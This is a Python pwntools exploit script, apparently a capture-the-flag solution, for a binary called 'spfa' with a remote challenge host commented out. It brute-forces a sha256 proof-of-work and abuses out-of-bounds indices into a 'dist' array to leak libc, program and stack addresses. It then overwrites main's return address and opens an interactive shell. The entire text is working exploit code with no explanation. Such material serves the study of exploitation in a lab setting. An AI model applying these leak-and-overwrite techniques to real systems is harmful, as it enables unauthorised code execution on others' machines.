# coding=utf-8 
from pwn import * 
context.log_level = "debug" 
context.terminal = ["/bin/tmux", "splitw", "-h"] 
local = False
local = True

# sh = remote('chuj.top', 47418) # nc chuj.top 47418
# libc = ELF('./libc-2.31.so')
sh = process("./spfa") 
elf = ELF("./spfa")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6") 

l64 = lambda      :u64(sh.recvuntil("\x7f")[-6:].ljust(8,"\x00"))
l32 = lambda      :u32(sh.recvuntil("\xf7")[-4:].ljust(4,"\x00"))
rl = lambda	a=False		: sh.recvline(a)
ru = lambda a,b=True	: sh.recvuntil(a,b)
rn = lambda x			: sh.recvn(x)
sn = lambda x			: sh.send(x)
sl = lambda x			: sh.sendline(x)
sa = lambda a,b			: sh.sendafter(a,b)
sla = lambda a,b		: sh.sendlineafter(a,b)
irt = lambda			: sh.interactive()
dbg = lambda text=None  : gdb.attach(sh, text)
lg = lambda s			: log.info('\033[1;31;40m %s --> 0x%x \033[0m' % (s, eval(s)))
lgs = lambda s			: log.info('\033[1;31;40m %s --> %s \033[0m' % (s, eval(s)))
uu32 = lambda data		: u32(data.ljust(4, '\x00'))
uu64 = lambda data		: u64(data.ljust(8, '\x00'))
ur64 = lambda data		: u64(data.rjust(8, '\x00'))

if local == False:
    ru('sha256(????) == ')
    sha256 = rn(64)
    lgs('sha256')
    import hashlib
    tmpstr = ''
    flag = False
    for i in range(48,127):
        for j in range(48,127):
            for k in range(48,127):
                for n in range(48,127):
                    tmpstr = chr(i)+chr(j)+chr(k)+chr(n)
                    hash=hashlib.sha256()
                    hash.update(bytes(tmpstr))
                    s = hash.hexdigest()
                    if s == sha256:
                        print(tmpstr)
                        flag = True
                        break
                if flag == True:
                    break
            if flag == True:
                break
        if flag == True:
            break


    sa('your ????> ',tmpstr)

sh.sendlineafter("datas?\n>> ", '4') 
# get libc base 
sh.sendlineafter("nodes?\n>> ", str(1)) 
sh.sendlineafter("edges?\n>> ", str(0)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str(-((elf.sym["dist"] - elf.got["puts"]) / 8))) 
sh.recvuntil("path is ") 
libc_base = int(sh.recvuntil("\n", drop = True), base = 10) - libc.sym["puts"] 
log.success("libc_base: " + hex(libc_base)) 
# get process base 
sh.sendlineafter("nodes?\n>> ", str(1)) 
sh.sendlineafter("edges?\n>> ", str(0)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str(-2367)) 
sh.recvuntil("path is ") 
proc_base = int(sh.recvuntil("\n", drop = True), base = 10) - 0x12E0 
log.success("proc_base: " + hex(proc_base)) 
# get environ (stack addr) 
# # environ 所在的地址与栈帧中存储 main 函数返回地址的位置的偏移是 0x100 
sh.sendlineafter("nodes?\n>> ", str(1)) 
sh.sendlineafter("edges?\n>> ", str(0)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str((libc_base + 0x1EF2E0 - proc_base - elf.sym["dist"]) / 8)) 
sh.recvuntil("path is ") 
environ_addr = int(sh.recvuntil("\n", drop = True), base = 10) 
log.success("environ_addr: " + hex(environ_addr)) 
dbg()
index_to_ret = (environ_addr - 0x100 - (proc_base + elf.sym["dist"])) / 8 
sh.sendlineafter("nodes?\n>> ", str(2)) 
sh.sendlineafter("edges?\n>> ", str(1)) 
sh.sendlineafter("format\n", "0 " + str(index_to_ret) + " " + str(proc_base + 0x16AA)) 
sh.sendlineafter("node?\n>> ", str(0)) 
sh.sendlineafter("to ?\n>> ", str(0)) 
sh.interactive()